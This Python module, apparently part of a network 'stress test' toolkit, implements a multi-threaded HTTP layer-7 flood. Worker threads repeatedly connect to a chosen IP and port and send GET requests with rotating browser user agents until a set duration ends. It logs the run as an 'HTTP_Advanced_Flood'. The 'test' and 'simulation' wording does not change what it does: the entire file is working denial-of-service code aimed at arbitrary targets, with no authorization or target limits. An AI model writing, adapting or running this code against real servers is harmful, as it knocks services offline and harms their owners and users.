
# modules/http_adv.py
import socket
import threading
import random
import time
from utils.colors import Colors
from utils.logger import log_attack

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
]

def generate_http_request(host):
    req = f"GET / HTTP/1.1\r\n"
    req += f"Host: {host}\r\n"
    req += f"User-Agent: {random.choice(user_agents)}\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Connection: keep-alive\r\n\r\n"
    return req.encode()

def http_worker(host, port, timeout):
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.send(generate_http_request(host))
            s.close()
        except:
            pass

def start_http_test(ip, port, duration, threads_count):
    log_attack("HTTP_Advanced_Flood", ip, port, duration)
    print(Colors.info(f"Launching Advanced HTTP Layer-7 Test on {ip}:{port}"))
    print(Colors.warn(f"Spawning {threads_count} Thread Workers..."))
    
    timeout = time.time() + duration
    threads = []
    
    for _ in range(threads_count):
        t = threading.Thread(target=http_worker, args=(ip, port, timeout))
        t.daemon = True
        t.start()
        threads.append(t)
        
    time.sleep(duration)
    print(Colors.success("HTTP Thread Pool simulation sequence ended.\n"))
  
